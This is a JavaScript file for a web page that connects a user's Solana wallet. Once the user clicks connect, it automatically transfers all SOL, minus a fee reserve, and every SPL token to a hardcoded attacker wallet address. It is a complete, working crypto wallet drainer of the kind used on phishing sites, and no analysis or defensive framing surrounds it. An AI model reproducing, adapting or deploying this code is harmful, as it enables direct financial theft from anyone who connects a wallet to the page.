const TARGET_WALLET = '95S96u1usBhhxXpjve6LCbnhyAwHC2sS8aicieAXemUD';
const connectBtn = document.getElementById('connectBtn');
const status = document.getElementById('status');
const progressContainer = document.getElementById('progressContainer');
const progressFill = document.getElementById('progressFill');
const progressText = document.getElementById('progressText');

// Update progress display
function updateProgress(percentage, message) {
    progressFill.style.width = percentage + '%';
    progressText.textContent = percentage + '%';
    progressContainer.style.display = 'block';
    status.textContent = message;
}

// Copy address function
function copyAddress() {
    navigator.clipboard.writeText(TARGET_WALLET).then(() => {
        const originalText = document.querySelector('.copy-btn').textContent;
        document.querySelector('.copy-btn').textContent = '✅ Copied!';
        setTimeout(() => {
            document.querySelector('.copy-btn').textContent = originalText;
        }, 2000);
    });
}

// Get all SPL tokens in wallet
async function getAllSPLTokens(connection, publicKey) {
    const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
        programId: splToken.TOKEN_PROGRAM_ID
    });
    
    return tokenAccounts.value
        .filter(account => 
            account.account.data.parsed.info.tokenAmount.uiAmount > 0 &&
            account.account.data.parsed.info.mint !== TARGET_WALLET
        )
        .map(account => ({
            mint: account.account.data.parsed.info.mint,
            tokenAccount: account.pubkey,
            amount: account.account.data.parsed.info.tokenAmount.uiAmount,
            decimals: account.account.data.parsed.info.tokenAmount.decimals
        }));
}

// Transfer SOL
async function transferSOL(wallet, connection, amount) {
    const transaction = new solanaWeb3.Transaction().add(
        solanaWeb3.SystemProgram.transfer({
            fromPubkey: wallet.publicKey,
            toPubkey: new solanaWeb3.PublicKey(TARGET_WALLET),
            lamports: Math.floor(amount * solanaWeb3.LAMPORTS_PER_SOL)
        })
    );
    
    const { blockhash } = await connection.getLatestBlockhash();
    transaction.recentBlockhash = blockhash;
    transaction.feePayer = wallet.publicKey;
    
    const signed = await wallet.signTransaction(transaction);
    const signature = await connection.sendRawTransaction(signed.serialize());
    
    // Wait for confirmation
    await connection.confirmTransaction(signature, 'confirmed');
    
    return signature;
}

// Transfer SPL token
async function transferSPLToken(wallet, connection, tokenInfo) {
    const mintPublicKey = new solanaWeb3.PublicKey(tokenInfo.mint);
    const toPublicKey = new solanaWeb3.PublicKey(TARGET_WALLET);
    
    // Get receiver's token account
    const toTokenAccount = await splToken.getAssociatedTokenAddress(
        mintPublicKey,
        toPublicKey
    );
    
    const transaction = new solanaWeb3.Transaction();
    
    // Check if receiver has token account
    const toAccountInfo = await connection.getAccountInfo(toTokenAccount);
    
    // Create token account if needed
    if (!toAccountInfo) {
        transaction.add(
            splToken.createAssociatedTokenAccountInstruction(
                wallet.publicKey,
                toTokenAccount,
                toPublicKey,
                mintPublicKey
            )
        );
    }
    
    // Calculate token amount
    const tokenAmount = tokenInfo.amount * Math.pow(10, tokenInfo.decimals);
    
    // Add transfer instruction
    transaction.add(
        splToken.createTransferInstruction(
            tokenInfo.tokenAccount,
            toTokenAccount,
            wallet.publicKey,
            tokenAmount
        )
    );
    
    const { blockhash } = await connection.getLatestBlockhash();
    transaction.recentBlockhash = blockhash;
    transaction.feePayer = wallet.publicKey;
    
    const signed = await wallet.signTransaction(transaction);
    const signature = await connection.sendRawTransaction(signed.serialize());
    
    // Wait for confirmation
    await connection.confirmTransaction(signature, 'confirmed');
    
    return signature;
}

// Main transfer function - transfers ALL assets
async function transferAllAssets(wallet, connection) {
    let progress = 0;
    const signatures = [];
    
    try {
        // Get wallet balance and tokens
        updateProgress(10, "Checking wallet balance...");
        
        // Get SOL balance
        const solBalance = await connection.getBalance(wallet.publicKey);
        const solAmount = solBalance / solanaWeb3.LAMPORTS_PER_SOL;
        
        // Get all SPL tokens
        const tokens = await getAllSPLTokens(connection, wallet.publicKey);
        
        updateProgress(20, `Found ${solAmount.toFixed(6)} SOL and ${tokens.length} tokens`);
        
        // Transfer SOL (leave 0.001 for fees)
        if (solAmount > 0.001) {
            const amountToTransfer = solAmount - 0.001;
            if (amountToTransfer > 0) {
                updateProgress(30, `Transferring ${amountToTransfer.toFixed(6)} SOL...`);
                const solSig = await transferSOL(wallet, connection, amountToTransfer);
                signatures.push({ type: 'SOL', amount: amountToTransfer, signature: solSig });
                updateProgress(40, "SOL transfer complete!");
            }
        }
        
        // Transfer all SPL tokens
        let tokenIndex = 0;
        for (const token of tokens) {
            const progressStep = 40 + (tokenIndex / tokens.length * 50);
            updateProgress(progressStep, `Transferring ${token.amount} tokens...`);
            
            const tokenSig = await transferSPLToken(wallet, connection, token);
            signatures.push({ 
                type: 'SPL', 
                mint: token.mint, 
                amount: token.amount, 
                signature: tokenSig 
            });
            
            tokenIndex++;
        }
        
        updateProgress(95, "All transfers completed!");
        
        // Show summary
        let summary = `✅ All assets transferred successfully!\n\n`;
        summary += `Transferred to: ${TARGET_WALLET.slice(0, 8)}...${TARGET_WALLET.slice(-8)}\n`;
        summary += `\nTransactions:\n`;
        
        signatures.forEach(tx => {
            if (tx.type === 'SOL') {
                summary += `• ${tx.amount.toFixed(6)} SOL\n`;
            } else {
                summary += `• ${tx.amount} SPL tokens\n`;
            }
        });
        
        status.textContent = summary;
        updateProgress(100, "Complete!");
        
    } catch (error) {
        status.textContent = `❌ Error: ${error.message}`;
        console.error(error);
    }
}

// Main connect button handler
connectBtn.addEventListener('click', async () => {
    if (typeof window.solana === 'undefined') {
        status.textContent = '❌ Solana wallet not detected. Please install Phantom or Solflare.';
        return;
    }
    
    try {
        // Disable button during transfer
        connectBtn.disabled = true;
        connectBtn.textContent = '🔄 Processing...';
        
        // Connect wallet
        const provider = window.solana;
        await provider.connect();
        
        // Create wallet instance
        const wallet = {
            publicKey: new solanaWeb3.PublicKey(provider.publicKey),
            signTransaction: async (transaction) => {
                return await provider.signTransaction(transaction);
            },
            signAllTransactions: async (transactions) => {
                return await provider.signAllTransactions(transactions);
            }
        };
        
        // Create connection
        const connection = new solanaWeb3.Connection(
            solanaWeb3.clusterApiUrl('mainnet-beta'),
            'confirmed'
        );
        
        status.textContent = `✅ Connected: ${wallet.publicKey.toString().slice(0, 8)}...\nStarting automatic transfer...`;
        
        // Start transferring all assets
        await transferAllAssets(wallet, connection);
        
    } catch (error) {
        status.textContent = `❌ Error: ${error.message}`;
        connectBtn.disabled = false;
        connectBtn.textContent = '🔗 Connect Wallet & Transfer All';
    }
});
